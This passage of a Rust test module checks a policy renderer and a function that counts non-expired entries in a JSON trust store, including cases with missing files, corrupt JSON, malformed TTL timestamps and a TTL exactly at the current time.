                custom_rules_count: 0,
            },
        };
        let html = render_policy(&ok);
        assert!(html.contains("Paranoia tier"));
        assert!(html.contains("closed"));
        assert!(!html.contains("Policy unavailable"));
    }

    #[test]
    fn count_trust_entries_handles_missing_and_expired() {
        let dir = tempfile::tempdir().unwrap();
        // Missing file → 0.
        assert_eq!(count_trust_entries(&dir.path().join("nope.json")), 0);

        // A store with one permanent, one future, one past entry → 2 non-expired.
        let path = dir.path().join("trust.json");
        let store = serde_json::json!({
            "version": 1,
            "entries": [
                {"pattern": "a", "added": "x", "source": "s"},
                {"pattern": "b", "added": "x", "source": "s", "ttl_expires": "2999-01-01T00:00:00+00:00"},
                {"pattern": "c", "added": "x", "source": "s", "ttl_expires": "2000-01-01T00:00:00+00:00"}
            ]
        });
        std::fs::write(&path, serde_json::to_string(&store).unwrap()).unwrap();
        assert_eq!(count_trust_entries(&path), 2);

        // A corrupt file → 0 (degrade gracefully, never panic).
        std::fs::write(&path, "{ not json").unwrap();
        assert_eq!(count_trust_entries(&path), 0);
    }

    #[test]
    fn count_trust_entries_treats_malformed_ttl_as_inactive() {
        // CodeRabbit M13 PR #132 R3-2: an unparseable `ttl_expires` is not active
        // (runtime enforcement skips it). One permanent + one garbage-TTL → 1.
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("trust.json");
        let store = serde_json::json!({
            "version": 1,
            "entries": [
                {"pattern": "ok", "added": "x", "source": "s"},
                {"pattern": "bad", "added": "x", "source": "s", "ttl_expires": "not-a-timestamp"}
            ]
        });
        std::fs::write(&path, serde_json::to_string(&store).unwrap()).unwrap();
        assert_eq!(
            count_trust_entries(&path),
            1,
            "a permanent entry counts; an entry with an unparseable ttl_expires must NOT"
        );
    }

    #[test]
    fn count_trust_entries_counts_ttl_equal_to_now_as_active() {
        // CodeRabbit M13 PR #132 R17-2: `merge_trust_store` expires only when
        // `expiry < now`, so `ttl_expires == now` is active. Pin the instant to
        // exercise the `>= now` boundary: at-now counts, a µs earlier does not.
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("trust.json");
        let now = chrono::Utc::now();
        let at_now = now.to_rfc3339();
        let just_past = (now - chrono::Duration::microseconds(1)).to_rfc3339();
        let store = serde_json::json!({
            "version": 1,
            "entries": [
                {"pattern": "now", "added": "x", "source": "s", "ttl_expires": at_now},
                {"pattern": "past", "added": "x", "source": "s", "ttl_expires": just_past}
            ]
        });
        std::fs::write(&path, serde_json::to_string(&store).unwrap()).unwrap();
        assert_eq!(
            count_trust_entries_at(&path, now),
            1,
            "ttl_expires == now is active (>= now); ttl_expires just before now is expired"
        );
    }
}
